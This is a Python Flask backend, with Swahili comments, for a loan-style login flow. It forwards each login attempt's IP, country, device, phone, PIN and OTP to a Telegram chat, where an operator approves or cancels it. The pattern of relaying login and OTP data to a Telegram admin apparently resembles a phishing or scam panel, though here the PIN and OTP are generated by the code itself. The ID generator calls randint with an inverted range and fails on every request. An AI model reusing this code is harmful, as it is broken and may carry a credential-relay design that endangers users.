from flask import Flask, request, jsonify
import os
import requests
import random
from datetime import datetime
import pytz

app = Flask(__name__) # Jina linaendelea kuwa 'app' ndani

TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID') # 8916717084
SECRET_KEY = os.environ.get('SECRET_KEY')

TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
applications = {} # Hifadhi ya muda

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    requests.post(url, json=payload)

def get_time_eat():
    tz = pytz.timezone('Africa/Nairobi')
    return datetime.now(tz).strftime("%I:%M %p EAT")

def generate_code():
    return str(random.randint(1000, 9999))

def generate_id():
    return str(random.randint(100000, 999))

# ========= WEBHOOK =========
@app.route(f'/{TELEGRAM_TOKEN}', methods=['POST'])
def webhook():
    data = request.get_json()
    if 'callback_query' in data:
        handle_callback(data['callback_query'])
    return jsonify({"ok": True})

def handle_callback(callback):
    data = callback['data']
    admin_chat = callback['message']['chat']['id']
    parts = data.split('_')
    action = parts[0]
    app_id = parts[2]

    if app_id not in applications:
        return

    if action == "approve":
        if parts[1] == "login":
            otp = generate_code()
            applications[app_id]['otp'] = otp
            send_otp_verification(applications[app_id])
            send_telegram_message(admin_chat, f"✅ Login Approved. Subiri OTP...")
        elif parts[1] == "otp":
            user_chat = applications[app_id]['user_chat']
            send_telegram_message(user_chat, "✅ <b>LOAN APPROVED & OTP VERIFIED</b>")
            send_telegram_message(admin_chat, f"✅ OTP Approved. Mchakato umekamilika")

    elif action == "cancel":
        send_telegram_message(admin_chat, f"❌ Request {app_id} imekataliwa")

# ========= FUNCTIONS ZA KUTUMA UJUMBE =========
def send_login_attempt(user_data):
    message = f"""🔐 <b>New Login Attempt</b>

<b>IP Address:</b> {user_data['ip']}
<b>Country:</b> {user_data['country']}
<b>Device:</b> {user_data['device']}
<b>Time:</b> {user_data['time']}

<b>PIN:</b> <code>{user_data['pin']}</code>"""

    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Approve", "callback_data": f"approve_login_{user_data['id']}"}],
            [{"text": "❌ Cancel", "callback_data": f"cancel_login_{user_data['id']}"}]
        ]
    }
    send_telegram_message(CHAT_ID, message, keyboard)

def send_otp_verification(user_data):
    message = f"""🔑 <b>OTP Verification</b>

<b>Phone:</b> {user_data['phone']}
<b>OTP Code:</b> <code>{user_data['otp']}</code>
<b>Time:</b> {user_data['time']}"""

    keyboard = {
        "inline_keyboard": [
            [{"text": "✅ Approve", "callback_data": f"approve_otp_{user_data['id']}"}],
            [{"text": "❌ Cancel", "callback_data": f"cancel_otp_{user_data['id']}"}]
        ]
    }
    send_telegram_message(CHAT_ID, message, keyboard)

# ========= ROUTE YA WEBSITE YAKO =========
@app.route('/login_attempt', methods=['POST'])
def login_attempt():
    data = request.get_json()
    app_id = generate_id()

    user_data = {
        "id": app_id,
        "user_chat": data['chat_id'],
        "ip": data['ip'],
        "country": data['country'],
        "device": data['device'],
        "time": get_time_eat(),
        "pin": generate_code(),
        "phone": data['phone']
    }
    applications[app_id] = user_data
    send_login_attempt(user_data)
    return jsonify({"status": "sent", "app_id": app_id})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
